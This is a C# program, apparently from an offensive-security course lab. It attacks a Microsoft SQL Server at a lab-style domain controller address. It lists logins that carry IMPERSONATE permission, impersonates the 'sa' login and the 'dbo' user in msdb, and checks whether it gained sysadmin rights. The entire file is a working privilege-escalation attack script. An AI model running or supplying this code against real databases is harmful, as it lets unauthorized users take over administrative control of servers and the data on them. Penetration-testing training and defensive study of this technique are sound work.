using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            string sqlServer = "dc01.corp1.com";
            string database = "master";

            string conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            using (SqlConnection con = new SqlConnection(conString))
            {
                try
                {
                    con.Open();
                    Console.WriteLine("Auth success!");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Auth failed: " + ex.Message);
                    Environment.Exit(0);
                }

                // 1. Enumerate logins that can be impersonated (as per course material)
                Console.WriteLine("\n--- Enumerating impersonatable logins ---");
                string impersonateQuery = @"
                    SELECT DISTINCT b.name
                    FROM sys.server_permissions a
                    INNER JOIN sys.server_principals b
                    ON a.grantor_principal_id = b.principal_id
                    WHERE a.permission_name = 'IMPERSONATE';";

                using (SqlCommand cmd = new SqlCommand(impersonateQuery, con))
                {
                    using (SqlDataReader reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            Console.WriteLine("Logins that can be impersonated: " + reader[0]);
                        }
                        reader.Close();
                    }
                }

                // 2. Server-level impersonation of 'sa'
                Console.WriteLine("\n--- Testing server-level impersonation of 'sa' ---");
                try
                {
                    // Before impersonation
                    ExecuteScalarQuery(con, "SELECT SYSTEM_USER;", "Executing in the context of (before): ");

                    // Perform impersonation
                    ExecuteNonQuery(con, "EXECUTE AS LOGIN = 'sa';");

                    // After impersonation
                    ExecuteScalarQuery(con, "SELECT SYSTEM_USER;", "Executing in the context of (after): ");
                    ExecuteScalarQuery(con, "SELECT IS_SRVROLEMEMBER('sysadmin');", "sysadmin membership: ");

                    // Revert
                    ExecuteNonQuery(con, "REVERT;");
                    ExecuteScalarQuery(con, "SELECT SYSTEM_USER;", "Context after REVERT: ");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Server-level impersonation failed: " + ex.Message);
                    // Ensure reversion even on error
                    try { ExecuteNonQuery(con, "REVERT;"); } catch { }
                }

                // 3. Database-level impersonation of 'dbo' in msdb
                Console.WriteLine("\n--- Testing database-level impersonation of 'dbo' in msdb ---");
                try
                {
                    // Before impersonation (in current database)
                    ExecuteScalarQuery(con, "SELECT USER_NAME();", "Database user (before): ");

                    // Perform impersonation in msdb
                    ExecuteNonQuery(con, "USE msdb; EXECUTE AS USER = 'dbo';");

                    // After impersonation
                    ExecuteScalarQuery(con, "SELECT USER_NAME();", "Database user (after): ");
                    ExecuteScalarQuery(con, "SELECT IS_SRVROLEMEMBER('sysadmin');", "sysadmin membership: ");

                    // Revert
                    ExecuteNonQuery(con, "REVERT;");
                    ExecuteScalarQuery(con, "SELECT USER_NAME();", "Database user after REVERT: ");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Database-level impersonation failed: " + ex.Message);
                    // Ensure reversion even on error
                    try { ExecuteNonQuery(con, "REVERT;"); } catch { }
                }

                con.Close();
            }

            Console.WriteLine("\nDone.");
        }

        // Helper to execute a query returning a single value
        static void ExecuteScalarQuery(SqlConnection con, string query, string label)
        {
            using (SqlCommand cmd = new SqlCommand(query, con))
            {
                object result = cmd.ExecuteScalar();
                Console.WriteLine(label + result);
            }
        }

        // Helper to execute a non-query statement
        static void ExecuteNonQuery(SqlConnection con, string query)
        {
            using (SqlCommand cmd = new SqlCommand(query, con))
            {
                cmd.ExecuteNonQuery();
            }
        }
    }
}
